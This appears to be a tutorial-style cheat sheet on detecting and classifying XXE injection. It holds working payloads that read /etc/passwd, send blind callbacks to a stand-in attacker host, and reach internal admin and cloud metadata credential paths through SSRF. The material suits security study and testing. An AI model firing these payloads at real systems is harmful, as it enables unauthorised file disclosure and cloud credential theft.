# XXE Injection

Step 1 — Is XML present?

Content-Type: application/xml

OR

<?xml version="1.0"?>

Step 2 — Inject DOCTYPE

<!DOCTYPE test [
<!ENTITY test "HELLO">
]>

Step 3 — Does the entity get displayed?

<data>&test;</data>

Response:

HELLO

Step 4 — Is there reflection?

Not all fields appear in the response.

<username>abc</username>
<email>xyz</email>

So each field has to be tested one by one. Maybe only the username is reflected.

Step 5 — External Entity test

<!ENTITY xxe SYSTEM "file:///etc/passwd">

Step 6 — External URL test

<!ENTITY xxe SYSTEM "http://example.com">

# XXE Successful Signs

HELLO appears → Entity is parsed
File content appears → In-band XXE
External request goes out → Blind XXE
Internal URL access → SSRF
XML error → possible XXE

# XXE Failed Signs

DOCTYPE disallowed → blocked
Unknown entity → disabled
XML invalid → syntax error
No reflection → maybe blind

# Types of XXE

By observing the response and server behavior, we can determine the type of XXE

1. In-band XXE

The data is directly visible in the response.

<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<data>
  <id>&xxe;</id>
</data>

Response:

root:x:0:0:root:/root:/bin/bash

2. Blind XXE

Nothing is visible in the response, BUT the server sends an external request. 

<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://attacker.com">
]>

<data>
  <id>&xxe;</id>
</data>

Response:

Invalid request (no output)
But attacker server receives request

3. SSRF via XXE

The server is fetching internal/external URLs.

<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">

/latest
/meta-data
/iam
/security-credentials

The server sends an internal request.

Signs

- Different response time
- Different error
- Internal data
- URL interaction

➡️ SSRF is occurring through XXE

4. Error-based XXE

Error message leaks sensitive data

example:

XML parsing failed:
root:x:0:0:root

# Observation

XXE Type              | Response & Behavior
----------------------|-------------------------------
In-band XXE          | File content appears in response
Blind XXE            | No output, but external request is triggered
SSRF via XXE         | Internal URLs can be accessed
Error-based XXE      | Sensitive data leaks in error message
